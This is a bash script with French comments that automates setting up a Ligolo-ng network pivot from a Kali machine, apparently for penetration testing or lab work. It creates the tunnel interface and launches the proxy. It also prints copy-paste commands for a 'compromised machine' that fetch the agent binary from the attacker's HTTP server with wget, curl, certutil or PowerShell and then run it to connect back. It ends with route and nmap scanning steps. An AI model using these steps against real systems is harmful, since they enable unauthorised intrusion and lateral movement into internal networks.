#!/bin/bash
# setup-ligolo.sh — Setup complet Ligolo-ng (proxy Kali + instructions agent)
# Usage: ./setup-ligolo.sh <subnet> [interface]
# Exemple: ./setup-ligolo.sh 172.16.8.0/24
#          ./setup-ligolo.sh 172.16.8.0/24 eth0
#
# Ce que ça fait (sur Kali) :
#   1. Crée l'interface tun ligolo
#   2. Lance le proxy ligolo-ng
#   3. Affiche les commandes à exécuter sur la cible
#   4. Affiche la route à ajouter après connexion de l'agent
#
# Prérequis : ligolo-ng installé (proxy + agent binaires disponibles)

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; B='\033[1m'; NC='\033[0m'

if [[ $# -lt 1 ]]; then
    echo -e "${R}Usage: $0 <subnet> [interface]${NC}"
    echo ""
    echo "  Ex: $0 172.16.8.0/24"
    echo "  Ex: $0 10.10.10.0/24 tun0"
    exit 1
fi

SUBNET="$1"
IFACE="${2:-tun0}"
PROXY_PORT="11601"
LIGOLO_IFACE="ligolo"

# Détecter l'IP de Kali sur l'interface
KALI_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
if [[ -z "$KALI_IP" ]]; then
    KALI_IP=$(hostname -I | awk '{print $1}')
fi

echo -e "${B}${C}"
echo "╔═════════════════════════════════════════════════════╗"
echo "║   setup-ligolo.sh — Pivot Setup"
echo "╠═════════════════════════════════════════════════════╣"
echo "║   Kali IP    : $KALI_IP"
echo "║   Interface  : $IFACE"
echo "║   Subnet     : $SUBNET"
echo "║   Proxy port : $PROXY_PORT"
echo "╚═════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ───────────────────────────────────────
# Trouver le binaire ligolo-proxy
# ───────────────────────────────────────
PROXY_BIN=""
for path in \
    "/opt/ligolo-ng/proxy" \
    "$HOME/Tools/ligolo-ng/proxy" \
    "$HOME/tools/ligolo-ng/proxy" \
    "/usr/local/bin/proxy" \
    "$(which proxy 2>/dev/null)" \
    "./proxy"; do
    [[ -x "$path" ]] && PROXY_BIN="$path" && break
done

AGENT_BIN=""
for path in \
    "/opt/ligolo-ng/agent" \
    "$HOME/Tools/ligolo-ng/agent" \
    "$HOME/tools/ligolo-ng/agent" \
    "/usr/local/bin/agent" \
    "$(which agent 2>/dev/null)" \
    "./agent"; do
    [[ -x "$path" ]] && AGENT_BIN="$path" && break
done

if [[ -z "$PROXY_BIN" ]]; then
    echo -e "${Y}[~] ligolo-ng proxy non trouvé automatiquement${NC}"
    echo -e "${Y}    Installer : https://github.com/nicocha30/ligolo-ng/releases${NC}"
    echo -e "${Y}    Ou : sudo apt install ligolo-ng${NC}"
    echo ""
    PROXY_BIN="proxy"  # Tenter quand même
fi

echo -e "${G}[✓] Proxy : $PROXY_BIN${NC}"
[[ -n "$AGENT_BIN" ]] && echo -e "${G}[✓] Agent : $AGENT_BIN${NC}" || echo -e "${Y}[~] Agent : non trouvé localement${NC}"
echo ""

# ───────────────────────────────────────
# 1. Créer l'interface tun
# ───────────────────────────────────────
echo -e "${C}[1] Création de l'interface tun '$LIGOLO_IFACE'...${NC}"

if ip link show "$LIGOLO_IFACE" &>/dev/null; then
    echo -e "${G}[✓] Interface $LIGOLO_IFACE existe déjà${NC}"
else
    if sudo ip tuntap add user "$USER" mode tun "$LIGOLO_IFACE" 2>/dev/null; then
        sudo ip link set "$LIGOLO_IFACE" up 2>/dev/null
        echo -e "${G}[✓] Interface $LIGOLO_IFACE créée${NC}"
    else
        echo -e "${R}[✗] Impossible de créer l'interface (pas de sudo ?)${NC}"
        echo -e "${Y}    Commande manuelle : sudo ip tuntap add user $USER mode tun $LIGOLO_IFACE && sudo ip link set $LIGOLO_IFACE up${NC}"
    fi
fi
echo ""

# ───────────────────────────────────────
# 2. Lancer le proxy
# ───────────────────────────────────────
echo -e "${C}[2] Lancement de ligolo-ng proxy...${NC}"
echo ""
echo -e "${Y}Ouvrir un nouveau terminal et lancer :${NC}"
echo -e "  ${G}$PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT${NC}"
echo ""

# Proposer de lancer dans un nouveau terminal
if command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "$PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT; read" &>/dev/null &
    echo -e "${G}[✓] Proxy lancé dans un nouveau terminal gnome${NC}"
elif command -v xterm &>/dev/null; then
    xterm -e "$PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT" &>/dev/null &
    echo -e "${G}[✓] Proxy lancé dans xterm${NC}"
else
    echo -e "${Y}[~] Lancer manuellement dans un terminal séparé${NC}"
fi

echo ""

# ───────────────────────────────────────
# 3. Instructions pour l'agent (cible)
# ───────────────────────────────────────
echo -e "${B}━━━ SUR LA MACHINE COMPROMISE ━━━${NC}"
echo ""

echo -e "${C}1. Transférer l'agent :${NC}"
echo ""
echo -e "  ${B}Linux  :${NC}"
echo -e "  ${G}wget http://$KALI_IP:8080/agent -O /tmp/agent && chmod +x /tmp/agent${NC}"
echo -e "  ${G}curl -o /tmp/agent http://$KALI_IP:8080/agent && chmod +x /tmp/agent${NC}"
echo ""
echo -e "  ${B}Windows :${NC}"
echo -e "  ${G}certutil -urlcache -f http://$KALI_IP:8080/agent.exe agent.exe${NC}"
echo -e "  ${G}Invoke-WebRequest -Uri http://$KALI_IP:8080/agent.exe -OutFile agent.exe${NC}"
echo ""

echo -e "${C}2. Lancer l'agent :${NC}"
echo ""
echo -e "  ${B}Linux  :${NC} ${G}/tmp/agent -connect $KALI_IP:$PROXY_PORT -ignore-cert${NC}"
echo -e "  ${B}Windows :${NC} ${G}.\\agent.exe -connect $KALI_IP:$PROXY_PORT -ignore-cert${NC}"
echo ""

# ───────────────────────────────────────
# 4. Dans la console Ligolo (après connexion)
# ───────────────────────────────────────
echo -e "${B}━━━ DANS LA CONSOLE LIGOLO (après que l'agent se connecte) ━━━${NC}"
echo ""
echo -e "  ${G}session${NC}           # Sélectionner la session"
echo -e "  ${G}start${NC}             # Démarrer le tunnel"
echo ""

echo -e "${C}3. Ajouter la route sur Kali (dans un autre terminal) :${NC}"
echo ""
echo -e "  ${G}sudo ip route add $SUBNET dev $LIGOLO_IFACE${NC}"
echo ""

# Routes multiples si plusieurs subnets attendus
echo -e "${Y}Si plusieurs subnets (machines additionnelles dans le réseau interne) :${NC}"
echo -e "  ${G}sudo ip route add 172.16.x.0/24 dev $LIGOLO_IFACE${NC}"
echo -e "  ${G}sudo ip route add 10.x.x.0/24 dev $LIGOLO_IFACE${NC}"
echo ""

# ───────────────────────────────────────
# 5. Serveur HTTP pour les fichiers
# ───────────────────────────────────────
echo -e "${B}━━━ SERVEUR HTTP POUR LES FICHIERS ━━━${NC}"
echo ""
echo -e "${C}Démarrer le serveur HTTP (dans le dossier avec les binaires) :${NC}"
echo ""

AGENT_DIR=""
[[ -n "$AGENT_BIN" ]] && AGENT_DIR=$(dirname "$AGENT_BIN")

if [[ -n "$AGENT_DIR" && -d "$AGENT_DIR" ]]; then
    echo -e "  ${G}cd $AGENT_DIR && python3 -m http.server 8080${NC}"
else
    echo -e "  ${G}python3 -m http.server 8080${NC}"
    echo -e "  ${Y}(dans le dossier contenant l'agent binaire)${NC}"
fi

echo ""

# ───────────────────────────────────────
# 6. Vérification
# ───────────────────────────────────────
echo -e "${B}━━━ VÉRIFICATION ━━━${NC}"
echo ""
echo -e "${C}Après avoir ajouté la route, tester avec :${NC}"
echo ""
echo -e "  ${G}ping -c1 \$(echo $SUBNET | cut -d'.' -f1-3).1${NC}      # ping le premier host"
echo -e "  ${G}nmap -sn $SUBNET${NC}                              # découvrir les hosts"
echo ""

# Résumé en commandes
echo -e "${B}━━━ RÉSUMÉ COMMANDES (copy-paste) ━━━${NC}"
echo ""
echo -e "${Y}# KALI — Terminal 1 (proxy) :${NC}"
echo -e "${G}$PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT${NC}"
echo ""
echo -e "${Y}# CIBLE — Agent :${NC}"
echo -e "${G}/tmp/agent -connect $KALI_IP:$PROXY_PORT -ignore-cert${NC}"
echo ""
echo -e "${Y}# KALI — Terminal 2 (après connexion) :${NC}"
echo -e "${G}sudo ip route add $SUBNET dev $LIGOLO_IFACE${NC}"
echo ""
echo -e "${Y}# Dans console ligolo :${NC}"
echo -e "${G}session → start${NC}"
echo ""
